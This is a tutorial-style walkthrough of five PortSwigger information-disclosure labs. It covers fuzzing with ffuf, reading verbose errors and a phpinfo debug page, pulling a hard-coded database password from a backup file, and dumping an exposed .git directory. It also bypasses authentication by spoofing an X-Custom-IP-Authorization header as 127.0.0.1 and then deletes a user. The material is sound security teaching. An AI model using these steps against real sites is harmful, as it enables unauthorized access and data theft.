
# Information Disclosure Labs

Here, we will explore information disclosure labs to better understand what these vulnerabilities entail, which types of information disclosures are most relevant to our interests, and how we can use tools and techniques to test websites for information disclosure.

## Testing for Information Disclosures

Testing for information disclosure can be challenging as it can happen anywhere in the application. Even seemingly insignificant information leaks can turn out to be valuable later on, so it's important to take note of any potentially useful information and continue to enumerate the application rather than focusing on just one type of vulnerability. Sometimes information disclosure vulnerabilities are discovered while searching for other types of vulnerabilities. Therefore, it's important to keep an open mind and avoid narrowing your testing approach too much. **We should learn how to recognize interesting information whenever we come across it, regardless of when or where it appears.**.

The tools and techniques we used to find information disclosures are the following.

- Fuzzing
- Proxy Tools i.e. Burp Suite, ZAP proxy, and Postman
- Debug/Error Response messages

## Fuzzing

Fuzzing is a technique in which we are sending large amounts of random or malformed data to the application in order to uncover vulnerabilities or bugs. The goal of fuzzing is to find unexpected behavior or crashes in the application that attackers can exploit.

Fuzzing typically involves the use of automated tools i.e. `ffuf`, `Gobuster`, `wfuzz` etc that generate and send random data to the application's input fields or network sockets. The data can be in various formats, including binary, ASCII, or Unicode. The tools can also be configured to modify existing data, such as changing the length of input fields or manipulating data structures.

Fuzzing can be used to test a wide range of software applications, including web applications, mobile applications, network protocols, and file formats. It can help identify vulnerabilities such as buffer overflows, input validation errors, and other issues related to handling unexpected or malformed data.

If you see any interesting parameters, we can do fuzzing which sends arbitrary data to see if the application shows some different behavior. To do fuzzing we should pay close attention to the following things.
- Status Code
- Response Length
- Response Time
- Response Words Count

## Proxy Tools

Proxy tools are a type of security tool used in web application security testing. They work by intercepting and analyzing the traffic between a web application and its users, allowing us to identify vulnerabilities and potential attacks.

There are two main types of proxy tools used in application security testing: intercepting proxies and transparent proxies.

1. **Intercepting proxies**: These tools sit between the user and the web application, intercepting and analyzing all traffic between the two. They can be used to identify vulnerabilities. Examples of intercepting proxy tools include Burp Suite, OWASP ZAP, and Fiddler.
2. **Transparent proxies**: These tools are designed to be transparent to the user and the web application, intercepting and analyzing traffic without the need for user configuration. They can be used to identify vulnerabilities such as malware infections and command-and-control traffic. Examples of transparent proxy tools include Squid, Blue Coat, and IronPort.

Proxy tools are an important component of web application security testing, as they allow us to identify and remediate vulnerabilities before they can be exploited by attackers.

## Debug/Error Response Messages

Using the above techniques and tools we often see a verbose error message that is sometimes disclosed information like a server in use and its version information, database query errors, code violation errors, and sometimes they often show us some part of code that leaks some confidential information. This information can be used to identify other attack possibilities like SQL injection, Command Injections, the vulnerable or outdated version that has a public exploit or vulnerability, etc.

## Common Places for Information Disclosure

Information disclosure occurs anywhere but some common places that we often find information disclosures are following.
- **Files for Web Crawlers**: Websites add files that tell the search engines not to crawl some pages i.e robots.txt that contain information about which pages should not be crawled by search engines can inadvertently reveal sensitive information about the web application's directory structure and functionality.
- **Directory listing**: If directory listing is enabled, attackers can easily navigate and access files and directories that were not intended to be publicly available.
- **Developer Comments**: Comments left by developers in code can contain sensitive information such as passwords or database connection strings.
- **Error Messages**: Error messages can reveal technical details about the web application and its underlying infrastructure, which can be used by attackers to identify vulnerabilities and launch attacks.
- **Debugging Data**: Debugging information left in code or stored in logs can contain sensitive information that can be used by attackers to launch attacks.
- **User account pages**: User account pages that display sensitive information such as usernames, email addresses, or passwords can be accessed by attackers through various means such as cross-site scripting (XSS) or SQL injection.
- **Backup files**: Backup files that contain sensitive information can be inadvertently left accessible to attackers, either through misconfiguration or by being stored in an unprotected location.
- **Insecure Configuration**: Poorly configured web servers or applications can inadvertently disclose sensitive information, such as database connection strings or other credentials.
- **Version control history**: Historical changes made to code in version control systems can contain sensitive information such as passwords or API keys.

### LAB #1: # Information disclosure in error messages

Lab URL: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages

**Objective:** Reveal the vulnerable version information of the framework in use.

In this lab, we see some kind of shopping application that include some products. We can see product details by clicking on the **`View Details`** button. They redirect us to the product description link in which they have a description of the product and other information related to the product. The link for the product description is like the following.

```
https://0a8800bd048efd9b820c2a9d00ef00e8.web-security-academy.net/product?productId=1
```

We see the parameter in the URL name `productId` that contains a numeric value. If we remove the value and send the request they give us a `json` response stating `Missing parameter: productId`. If we give him some high value i.e.` 10000` they say `Not Found` but if we give him something other than numbers they throw a full debug error message that disclosed its source code information but also disclosed the backend framework in use and its version information also. The whole error message is like the following.

```
Internal Server Error: java.lang.NumberFormatException: For input string: "a"
	at java.base/java.lang.NumberFormatException.forInputString(NumberFormatException.java:67)
	at java.base/java.lang.Integer.parseInt(Integer.java:668)
	at java.base/java.lang.Integer.parseInt(Integer.java:786)
	at lab.i.d.n.w.Z(Unknown Source)
	at lab.x.si.i.r.F(Unknown Source)
	at lab.x.si.g.r.z.X(Unknown Source)
	at lab.x.si.g.w.lambda$handleSubRequest$0(Unknown Source)
	at q.e.r.p.lambda$null$3(Unknown Source)
	at q.e.r.p.l(Unknown Source)
	at q.e.r.p.lambda$uncheckedFunction$4(Unknown Source)
	at java.base/java.util.Optional.map(Optional.java:260)
	at lab.x.si.g.w.E(Unknown Source)
	at lab.server.d.v.d.W(Unknown Source)
	at lab.x.si.x.e(Unknown Source)
	at lab.x.si.x.W(Unknown Source)
	at lab.server.d.v.b.k.p(Unknown Source)
	at lab.server.d.v.b.p.lambda$handle$0(Unknown Source)
	at lab.i.l.v.m.l(Unknown Source)
	at lab.server.d.v.b.p.Q(Unknown Source)
	at lab.server.d.v.n.t(Unknown Source)
	at q.e.r.p.lambda$null$3(Unknown Source)
	at q.e.r.p.l(Unknown Source)
	at q.e.r.p.lambda$uncheckedFunction$4(Unknown Source)
	at lab.server.az.P(Unknown Source)
	at lab.server.d.v.n.W(Unknown Source)
	at lab.server.d.a.o.r(Unknown Source)
	at lab.server.d.r.r(Unknown Source)
	at lab.server.d.y.r(Unknown Source)
	at lab.server.w.u(Unknown Source)
	at lab.server.w.Y(Unknown Source)
	at lab.z.t.lambda$consume$0(Unknown Source)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1136)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:635)
	at java.base/java.lang.Thread.run(Thread.java:833)

Apache Struts 2 2.3.31
```

we see they are using the `Apache Struts 2 2.3.31` framework that is old dated and vulnerable submit that name to solve the lab.

### LAB #2 Information disclosure on debug page

Lab URL: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-on-debug-page

**Objective:** Disclosed the Secret Key from the debugging page.

In this lab, we see some kind of shopping application that include some products. We can see product details by clicking on the **`View Details`** button. They redirect us to the product description link in which they have a description of the product and other information related to the product. If we see the source code of this application's main page we see a developer comment that shows a debug page endpoint. The whole comment is like the following.

```
<!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->
```

If we go to that endpoint we see a `phpinfo.php` file that contains information about the environment, and version information, and also disclosed the site's secret key. The whole URL is like the following.

```
https://0a9300f20332eacb811a13db00c2009f.web-security-academy.net/cgi-bin/phpinfo.php
```

Copy the Secret Key and submit it to solve the lab.

### LAB #3: Source Code disclosure via backup files

Lab URL: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files

**Objective:** Get the Source code Backup file that is hidden in the application. After getting the source file gets the hard-coded database password from it.

In this lab, we see some kind of shopping application that include some products. We can see product details by clicking on the **`View Details`** button. They redirect us to the product description link in which they have a description of the product and other information related to the product. We didn't see any developer comments in it but when we do fuzzing using the tools like `fuff` we find a directory name backup that has directory listing enable in which we see a file name `ProductTemplate.java.bak` that contains the source code. The `ffuf` common for fuzzing or also known as Content Discovery is the following.

```
$ ffuf -w /usr/share/wordlist/dirbuster/directory-list-2.3-small.txt:FUZZ -u https://0adc004c0368c88d852077c100a3002d.web-security-academy.net/FUZZ -ic -t 100
```

Where,

- **`-w`**: Used to specify wordlist.
- **`-u`**: Used to specify URL.
- **`FUZZ`**: This is a keyword or a placeholder that is replaced with the words in the wordlist.
- **`-ic`**: Used to ignore comments in the wordlist.
- **`-t`**: Used to specify the Number of concurrent threads for fast fuzzing.

We see there is a `/backup` endpoint that enables a directory list in which they have a `ProductTemplate.java.bak` file containing source code. We see the database hard-coded passwords that are in the `ConnectionBuilder` function which is like the following.

```java
ConnectionBuilder connectionBuilder = ConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "paerlui1f6nt1ce09u83h30595ynge91"
        ).withAutoCommit();
```

We see the last entry is for password `paerlui1f6nt1ce09u83h30595ynge91`, copy and submit it to solve the lab.

### LAB #4: Authentication bypass via information disclosure

Lab URL: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass

**Given Credential**

```
wiener:peter
```

**Objective:** Bypass Authentication to get the administrative functions or privileges and delete Carlos's user account.

In this lab, we see some kind of shopping application that include some products. We can see product details by clicking on the **`View Details`** button. They redirect us to the product description link in which they have a description of the product and other information related to the product. We also have a `My account` endpoint that redirects us to the `/login` endpoint if we are not login, otherwise, they show us our account details. We can login to our account using the username and password combination.

We start doing content discovery to find hidden directories using tools like `ffuf` or `gobuster` with the following command.

```
$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u https://0a8d008d03dc2eba801c5876002f0014.web-security-academy.net/FUZZ -ic
```

We got the result like the following.

```
login [Status: 200, Size: 2931, Words: 1103, Lines: 62, Duration: 261ms]
admin [Status: 401, Size: 2348, Words: 835, Lines: 52, Duration: 206ms]
```

We know about `login` but when we visit the `admin` endpoint we see the following result there.

```
Admin interface only available to local users
```

This state that only Local users mean only users that are using the system locally can see the admin functionality. That is useful information that tells us we can access the admin functionality if by chance we tell the server we are using the application from `localhost`.

After successful login, we couldn't see any useful information just the normal stuff but in the web vulnerability scanner like `nikto`, or `burp suite` we see there is a `TRACE` method supported.

**TRACE** is an HTTP request method that is used for debugging and troubleshooting purposes. When a server receives a TRACE request, it echoes back the entire request message, including all headers, to the client. This can be useful for developers to understand how a web application is handling a specific request, or to troubleshoot issues with a web server.

When we use this method using the tools like `curl` with the following command their output is like the following.

```
$ curl -X TRACE -i https://0a8d008d03dc2eba801c5876002f0014.web-security-academy.net/

HTTP/2 200 
content-type: message/http
x-frame-options: SAMEORIGIN
content-length: 186

TRACE / HTTP/1.1
Host: 0a8d008d03dc2eba801c5876002f0014.web-security-academy.net
user-agent: curl/7.88.1
accept: */*
Content-Length: 0
X-Custom-IP-Authorization: 185.168.184.15
```

You will see everything is echo back typically but one header is not set by us. We didn't set the `X-Custom-IP-Authorization` header they are set by the server. We know the TRACE method only echoes back the entire request header set by us so if the header is not set by us then this is indeed set by the server.

We set that header to our login session and change its value to `127.0.0.1` and we see our response contains the admin panel option, the complete request is like the following.

**Request:**
```
GET /my-account HTTP/2
Host: 0a8d008d03dc2eba801c5876002f0014.web-security-academy.net
Cookie: session=8YbNiyhY0Y8eQATX3pPgsHO8DllrAUSH
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://0a8d008d03dc2eba801c5876002f0014.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
X-Custom-Ip-Authorization: 127.0.0.1
```

**Response:**

```html
.
.
<section class="top-links">
<a href=/>Home</a><p>|</p>
<a href="/admin">Admin panel</a><p>|</p>
<a href="/my-account?id=wiener">My account</a><p>|</p>
<a href="/logout">Log out</a><p>|</p>
</section>
.
.
```

There we see we didn't change our account to administrator but we got access to admin functionality that we could use to delete the `carlos` user. To delete carlos user sends the get request like the following.

```
GET /admin/delete?username=carlos HTTP/2
Host: 0a8d008d03dc2eba801c5876002f0014.web-security-academy.net
Cookie: session=8YbNiyhY0Y8eQATX3pPgsHO8DllrAUSH
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://0a8d008d03dc2eba801c5876002f0014.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
X-Custom-Ip-Authorization: 127.0.0.1
```

In this lab, we see the debug message often shows some information that could use to fully compromise the server or can be used to do privilege escalation.

### LAB #5: Information disclosure in version control history

Lab URL: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history

**Objective:** Exploit the information disclosure by getting the version control history files left in the application that contains `administrator` credentials. Use that credentials to delete user carlos.

In this lab, we see some kind of shopping application that include some products. We can see product details by clicking on the **`View Details`** button. They redirect us to the product description link in which they have a description of the product and other information related to the product. We also have a `My account` endpoint that redirects us to the `/login` endpoint if we are not login, otherwise, they show us our account details. We can login to our account using the username and password combination.

We start content discovery to find some hidden directories and found the following results.

```
$ ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ -u https://0aa4007403234054820c8ef300e40056.web-security-academy.net/FUZZ -ic -t 100
 
.git/HEAD [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 248ms]
ADMIN [Status: 401, Size: 2373, Words: 840, Lines: 52, Duration: 204ms]
analytics [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 195ms]
Admin [Status: 401, Size: 2373, Words: 840, Lines: 52, Duration: 217ms]
admin [Status: 401, Size: 2373, Words: 840, Lines: 52, Duration: 211ms]
favicon.ico [Status: 200, Size: 15406, Words: 11, Lines: 1, Duration: 226ms]
filter [Status: 200, Size: 10510, Words: 4852, Lines: 197, Duration: 229ms]
logout [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 213ms]
login [Status: 200, Size: 2938, Words: 1105, Lines: 62, Duration: 450ms]
Login [Status: 200, Size: 2938, Words: 1105, Lines: 62, Duration: 252ms]
my-account [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 216ms]
```

We see there is a `.git` directory and after visiting we see they have enabled directory indexing also. The `.git` directory is a hidden directory that is created when a Git repository is initialized in a directory. It contains the version control history and configuration files for the Git repository. In the `.git` directory, we see the following directories that have their own purposes let's see about it.

- The `HEAD` file, which points to the current branch.
- The `refs` directory, which contains pointers to commits, tags, and branches.
- The `objects` directory, which stores the actual content of the files and directories that are being tracked by Git.
- The `config` file, which contains the repository-specific configuration settings.
- The `hooks` directory, which contains scripts that can be executed before or after certain Git commands.

It is important to ensure that the `.git` directory is not publicly accessible on a web server, as it can contain sensitive information such as passwords and access tokens that should not be made available to the public and in that case it is accessible.

So now we know there is an exposed `.git` directory and its purpose, we can download all the content of the `.git` directory by using the following command.

```
$ wget -r https://0aa4007403234054820c8ef300e40056.web-security-academy.net/.git
```

This is to download all the files of the `.git` directory. **Note** This is only downloaded automatically because they have enabled the directory indexing so if they didn't have that then we have to download all of that manually. When the download is complete we can use the `git` tool or also use other tools like `git cola` to see the comments details or other version history information.

For simplicity, I used git cola because they are GUI based and easy to use other the the `git` original tools that required knowing lots of commands. Option the `.git` directory in `git cola`; there you will see some changes to the `admin.conf` file. Right-click on it and select `View History` this will show you all the history changes made to these files and you will see the admin password was changed with the placeholder `ADMIN_PASSWORD`. Copy the admin password and use that login to the `administrator` account using that password. After login go to the `/admin` endpoint and delete the carlos user to solve this lab.

In this lab, we see sometimes the version control history files like `.git` or some backup files are exposed publicly and that could be used to get clear text passwords or some other type of information like source code disclosure.